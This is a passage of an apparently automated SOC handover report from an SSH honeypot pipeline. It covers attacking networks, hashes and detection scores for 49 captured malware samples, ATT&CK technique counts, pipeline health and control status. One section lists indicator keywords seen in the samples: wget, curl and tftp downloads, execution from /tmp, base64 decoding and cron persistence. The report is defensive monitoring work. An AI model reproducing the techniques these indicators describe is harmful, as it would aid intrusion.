| High-Risk ASNs | **0** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS46562` | Performive LLC | 5 | LOW |
| `AS31898` | Oracle Corporation | 4 | LOW |
| `AS63949` | Akamai Connected Cloud | 4 | LOW |
| `AS203214` | Hulum Almustakbal Company for Communication Engineering and Services Ltd | 3 | LOW |
| `AS396982` | Google LLC | 2 | LOW |
| `AS20115` | Charter Communications LLC | 2 | LOW |
| `AS4134` | CHINANET BACKBONE | 2 | LOW |
| `AS50581` | Ukrainian Telecommunication Group LLC | 2 | LOW |

---

---

## 🚨 Priority Cases — Immediate Attention (0)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

_No priority cases this shift. All confirmed sessions were credential scans only._

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

_No reconnaissance sessions this shift._

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 64/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/75** 🔴 |
| `0b5fec6e8ed11eb6d3e389cc82184d2f15121e35e4c56f1570af01230cb2d84b` | Unknown binary | `0b5fec6e8ed11eb6...` | 0/100 | 🟢 LOW | Not in VT |
| `0dc95fb4077cce0bff19aa1a77109d059dff6503bbf6c1b0dd2f41fc0a4c88e7` | Unknown binary | `0dc95fb4077cce0b...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 84/100 | 🔴 HIGH | **36/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 41/100 | 🟡 MEDIUM | **29/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 70/100 | 🔴 HIGH | **26/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 50/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 44/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `31d4181843b1ed10a7e7cb3f108f6d6c50a7a4452ee52ddacabe8ca77260615e` | Bash Script | `31d4181843b1ed10...` | 60/100 | 🟡 MEDIUM | **26/75** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

_`197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` (197c74408e15bd1168105f56...)_
- `Execution from /tmp` — `/tmp/clean_file`
- `Base64 decode (obfuscation)` — `base64 -d`
- `Cron persistence` — `crontab`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 156 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 145 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 117 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 115 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 114 |

---

## 🔕 False Positive Summary (221 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 221 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 221 cases |
| Tool 34  | Credential Extractor        | ✅ 319 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 13 fingerprints |
| Tool 36  | Command Clustering          | ✅ 6 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 78 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 221 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 60 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 22 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-09T22:35:46Z_
